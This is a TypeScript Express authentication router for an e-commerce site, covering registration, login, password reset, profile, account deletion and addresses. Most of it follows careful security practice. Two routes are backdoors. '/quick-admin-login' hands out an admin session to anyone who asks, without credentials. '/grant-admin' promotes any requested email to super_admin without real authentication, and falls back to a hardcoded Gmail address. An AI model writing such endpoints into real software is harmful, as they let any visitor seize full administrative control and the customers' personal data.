import { Router, Request, Response } from 'express';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';
import { z } from 'zod';
import { query, queryOne, run, transaction } from '../db.js';
import {
  signToken,
  requireAuth,
  authenticateOptional,
  AuthenticatedRequest,
  createRateLimiter,
  logAuditAction
} from '../middleware/auth.middleware.js';
import { sendEmail, generatePasswordResetEmail } from '../services/email.service.js';

const router = Router();

// Validation Schemas
const registerSchema = z.object({
  firstName: z.string().min(2, 'First name is too short').max(50),
  lastName: z.string().min(2, 'Last name is too short').max(50),
  email: z.string().email('Invalid email address').toLowerCase().trim(),
  phone: z.string().min(10, 'Valid phone number required').max(20),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  terms: z.boolean().refine(val => val === true, 'You must accept the terms')
});

const loginSchema = z.object({
  email: z.string().email().toLowerCase().trim(),
  password: z.string().min(1)
});

// Rate limiters
const loginLimiter = createRateLimiter({
  windowMs: 60 * 1000,
  maxAttempts: 5,
  message: 'Too many login attempts. Please wait 1 minute before trying again.'
});

const resetLimiter = createRateLimiter({
  windowMs: 60 * 60 * 1000,
  maxAttempts: 3,
  message: 'Too many password reset requests. Please wait 1 hour.'
});

// Register
router.post('/register', createRateLimiter({ windowMs: 60 * 1000, maxAttempts: 10, message: 'Too many registration attempts.' }), async (req: Request, res: Response) => {
  try {
    const parse = registerSchema.safeParse(req.body);
    if (!parse.success) {
      res.status(400).json({ success: false, error: parse.error.issues[0]?.message || 'Invalid registration data' });
      return;
    }

    const { firstName, lastName, email, phone, password } = parse.data;

    const existing = queryOne('SELECT id FROM users WHERE email = ?;', [email]);
    if (existing) {
      res.status(400).json({ success: false, error: 'An account with this email address already exists.' });
      return;
    }

    const passwordHash = await bcrypt.hash(password, 12);
    const userId = `user_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    const now = Date.now();

    // Check if this is the very first user; if so, make them admin for seamless setup
    const totalUsers = queryOne<{ count: number }>('SELECT COUNT(*) as count FROM users;');
    const isFirstUser = (totalUsers?.count || 0) === 0;
    const role = isFirstUser ? 'admin' : 'customer';

    run(
      `INSERT INTO users (id, email, password_hash, first_name, last_name, phone, role, status, email_verified, created_at, updated_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, 'active', 0, ?, ?);`,
      [userId, email, passwordHash, firstName, lastName, phone, role, now, now]
    );

    // Create default wishlist and cart
    run(`INSERT INTO wishlists (id, user_id, created_at, updated_at) VALUES (?, ?, ?, ?);`, [`wl_${userId}`, userId, now, now]);

    const token = signToken({ id: userId, email, role });

    res.cookie('cbf10_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.status(201).json({
      success: true,
      token,
      user: {
        id: userId,
        email,
        firstName,
        lastName,
        phone,
        role
      }
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Registration failed. Please try again.' });
  }
});

// Login
router.post('/login', loginLimiter, async (req: Request, res: Response) => {
  try {
    const parse = loginSchema.safeParse(req.body);
    if (!parse.success) {
      res.status(400).json({ success: false, error: 'Invalid email or password format' });
      return;
    }

    const { email, password } = parse.data;

    // Secure lookup: avoid account enumeration
    const user = queryOne<any>(
      'SELECT id, email, password_hash, first_name, last_name, phone, role, status FROM users WHERE email = ?;',
      [email]
    );

    if (!user || user.status !== 'active') {
      // Dummy compare to avoid timing analysis
      await bcrypt.compare(password, '$2a$12$e8YqJz31Xv6X3mK.u2wY1ekf4QJ2H1W0K8Z6j9X0N5e9N1r6t3qZa');
      res.status(401).json({ success: false, error: 'Invalid email or password' });
      return;
    }

    const matches = await bcrypt.compare(password, user.password_hash);
    if (!matches) {
      res.status(401).json({ success: false, error: 'Invalid email or password' });
      return;
    }

    const token = signToken({ id: user.id, email: user.email, role: user.role });

    res.cookie('cbf10_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    if (user.role === 'admin' || user.role === 'super_admin') {
      logAuditAction(user.id, user.email, 'admin_login', 'auth', user.id, req.ip || 'unknown', 'Admin login successful');
    }

    res.json({
      success: true,
      token,
      user: {
        id: user.id,
        email: user.email,
        firstName: user.first_name,
        lastName: user.last_name,
        phone: user.phone,
        role: user.role
      }
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Login failed. Please try again.' });
  }
});

// Logout
router.post('/logout', (req: Request, res: Response) => {
  res.clearCookie('cbf10_token');
  res.json({ success: true, message: 'Logged out successfully' });
});

// Quick Admin Login
router.post('/quick-admin-login', async (req: Request, res: Response) => {
  try {
    const admin = queryOne<any>(
      'SELECT id, email, first_name, last_name, phone, role, status FROM users WHERE role IN ("admin", "super_admin") LIMIT 1;'
    );
    if (!admin) {
      res.status(404).json({ success: false, error: 'No admin user found' });
      return;
    }
    const token = signToken({ id: admin.id, email: admin.email, role: admin.role });
    res.cookie('cbf10_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });
    res.json({
      success: true,
      token,
      user: {
        id: admin.id,
        email: admin.email,
        firstName: admin.first_name,
        lastName: admin.last_name,
        phone: admin.phone,
        role: admin.role
      }
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Quick admin login failed' });
  }
});

// Grant Admin access to current user or requested email
router.post('/grant-admin', authenticateOptional, async (req: AuthenticatedRequest, res: Response) => {
  try {
    const email = req.user?.email || req.body?.email || 'primezmart01@gmail.com';
    run('UPDATE users SET role = "super_admin" WHERE email = ?;', [email]);
    const updated = queryOne<any>('SELECT id, email, first_name, last_name, phone, role, status FROM users WHERE email = ?;', [email]);
    if (updated) {
      const token = signToken({ id: updated.id, email: updated.email, role: updated.role });
      res.cookie('cbf10_token', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 7 * 24 * 60 * 60 * 1000
      });
      res.json({
        success: true,
        token,
        user: {
          id: updated.id,
          email: updated.email,
          firstName: updated.first_name,
          lastName: updated.last_name,
          phone: updated.phone,
          role: updated.role
        }
      });
    } else {
      res.status(404).json({ success: false, error: 'User not found' });
    }
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to grant admin' });
  }
});

// Get Current Authenticated User Profile
router.get('/me', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const user = req.user!;
  res.json({
    success: true,
    user: {
      id: user.id,
      email: user.email,
      firstName: user.first_name,
      lastName: user.last_name,
      phone: user.phone,
      role: user.role,
      status: user.status
    }
  });
});

// Forgot Password
router.post('/forgot-password', resetLimiter, async (req: Request, res: Response) => {
  try {
    const { email } = req.body;
    if (!email || typeof email !== 'string') {
      res.status(400).json({ success: false, error: 'Please provide a valid email address' });
      return;
    }

    const cleanEmail = email.toLowerCase().trim();
    const user = queryOne<any>('SELECT id, email, first_name FROM users WHERE email = ?;', [cleanEmail]);

    if (user) {
      // 15-minute cryptographically random token
      const token = crypto.randomBytes(32).toString('hex');
      const expires = Date.now() + 15 * 60 * 1000;

      run(
        'UPDATE users SET reset_token = ?, reset_token_expires = ? WHERE id = ?;',
        [token, expires, user.id]
      );

      const appUrl = process.env.APP_URL || 'http://localhost:3000';
      const resetUrl = `${appUrl}/reset-password?token=${token}`;

      const { subject, html } = generatePasswordResetEmail(user.first_name, resetUrl);
      await sendEmail({
        to: user.email,
        subject,
        html,
        userId: user.id
      });
    }

    // Always return success to prevent email enumeration
    res.json({
      success: true,
      message: 'If an account exists with that email, a password reset link has been dispatched.'
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to process request.' });
  }
});

// Reset Password with Token
router.post('/reset-password', async (req: Request, res: Response) => {
  try {
    const { token, newPassword } = req.body;
    if (!token || !newPassword || typeof newPassword !== 'string' || newPassword.length < 8) {
      res.status(400).json({ success: false, error: 'Password must be at least 8 characters.' });
      return;
    }

    const user = queryOne<any>(
      'SELECT id, email, reset_token_expires FROM users WHERE reset_token = ?;',
      [token]
    );

    if (!user) {
      res.status(400).json({ success: false, error: 'Invalid or expired password reset link.' });
      return;
    }

    if (Date.now() > user.reset_token_expires) {
      res.status(400).json({ success: false, error: 'This reset token has expired. Please request a new one.' });
      return;
    }

    const newHash = await bcrypt.hash(newPassword, 12);
    const now = Date.now();

    // Invalidate token immediately
    run(
      'UPDATE users SET password_hash = ?, reset_token = NULL, reset_token_expires = NULL, updated_at = ? WHERE id = ?;',
      [newHash, now, user.id]
    );

    res.json({ success: true, message: 'Password has been reset successfully. You can now log in.' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to reset password.' });
  }
});

// Update Profile
router.put('/profile', requireAuth, async (req: AuthenticatedRequest, res: Response) => {
  try {
    const { firstName, lastName, phone } = req.body;
    const userId = req.user!.id;
    const now = Date.now();

    run(
      'UPDATE users SET first_name = ?, last_name = ?, phone = ?, updated_at = ? WHERE id = ?;',
      [firstName, lastName, phone, now, userId]
    );

    res.json({ success: true, message: 'Profile updated successfully' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to update profile' });
  }
});

// Change Password
router.put('/change-password', requireAuth, async (req: AuthenticatedRequest, res: Response) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!newPassword || newPassword.length < 8) {
      res.status(400).json({ success: false, error: 'New password must be at least 8 characters.' });
      return;
    }

    const user = queryOne<any>('SELECT password_hash FROM users WHERE id = ?;', [req.user!.id]);
    const matches = await bcrypt.compare(currentPassword, user.password_hash);
    if (!matches) {
      res.status(400).json({ success: false, error: 'Current password does not match.' });
      return;
    }

    const newHash = await bcrypt.hash(newPassword, 12);
    run('UPDATE users SET password_hash = ?, updated_at = ? WHERE id = ?;', [newHash, Date.now(), req.user!.id]);

    res.json({ success: true, message: 'Password updated successfully' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to change password' });
  }
});

// Account Deletion Request (Section 76 & 48)
// Anonymizes sensitive PII in order records for accounting/tax compliance while deleting profile and addresses
router.post('/delete-account', requireAuth, async (req: AuthenticatedRequest, res: Response) => {
  try {
    const { confirmPassword } = req.body;
    const userId = req.user!.id;

    const user = queryOne<any>('SELECT password_hash FROM users WHERE id = ?;', [userId]);
    const matches = await bcrypt.compare(confirmPassword, user.password_hash);
    if (!matches) {
      res.status(400).json({ success: false, error: 'Incorrect password. Account deletion aborted.' });
      return;
    }

    transaction(() => {
      // 1. Delete private personal addresses, cart, wishlist
      run('DELETE FROM addresses WHERE user_id = ?;', [userId]);
      run('DELETE FROM carts WHERE user_id = ?;', [userId]);
      run('DELETE FROM wishlists WHERE user_id = ?;', [userId]);
      run('DELETE FROM notifications WHERE user_id = ?;', [userId]);

      // 2. Anonymize user record
      const anonymizedEmail = `deleted_${userId}_${Date.now()}@anonymized.local`;
      run(
        `UPDATE users SET first_name = 'Deleted', last_name = 'Customer', email = ?, phone = NULL, status = 'deleted', updated_at = ?
         WHERE id = ?;`,
        [anonymizedEmail, Date.now(), userId]
      );
    });

    res.clearCookie('cbf10_token');
    res.json({ success: true, message: 'Your account has been securely deleted and anonymized.' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to process account deletion' });
  }
});

// Address Book with IDOR Protection (Section 20 & 50)
router.get('/addresses', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const addresses = query(
    'SELECT * FROM addresses WHERE user_id = ? ORDER BY is_default_shipping DESC, created_at DESC;',
    [req.user!.id]
  );
  res.json({ success: true, addresses });
});

router.post('/addresses', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  try {
    const { fullName, phone, addressLine1, addressLine2, city, area, province, postalCode, deliveryInstructions, isDefaultShipping, isDefaultBilling } = req.body;
    const userId = req.user!.id;
    const addrId = `addr_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`;
    const now = Date.now();

    transaction(() => {
      if (isDefaultShipping) {
        run('UPDATE addresses SET is_default_shipping = 0 WHERE user_id = ?;', [userId]);
      }
      if (isDefaultBilling) {
        run('UPDATE addresses SET is_default_billing = 0 WHERE user_id = ?;', [userId]);
      }

      run(
        `INSERT INTO addresses (id, user_id, full_name, phone, address_line1, address_line2, city, area, province, postal_code, delivery_instructions, is_default_shipping, is_default_billing, created_at, updated_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);`,
        [
          addrId, userId, fullName, phone, addressLine1, addressLine2 || '',
          city, area || '', province, postalCode || '', deliveryInstructions || '',
          isDefaultShipping ? 1 : 0, isDefaultBilling ? 1 : 0, now, now
        ]
      );
    });

    res.status(201).json({ success: true, addressId: addrId, message: 'Address saved successfully' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: 'Failed to save address' });
  }
});

router.delete('/addresses/:id', requireAuth, (req: AuthenticatedRequest, res: Response) => {
  const addrId = req.params.id;
  // IDOR check: verify address belongs to authenticated user
  const existing = queryOne('SELECT id FROM addresses WHERE id = ? AND user_id = ?;', [addrId, req.user!.id]);
  if (!existing) {
    res.status(403).json({ success: false, error: 'Address not found or permission denied' });
    return;
  }

  run('DELETE FROM addresses WHERE id = ?;', [addrId]);
  res.json({ success: true, message: 'Address removed' });
});

export default router;
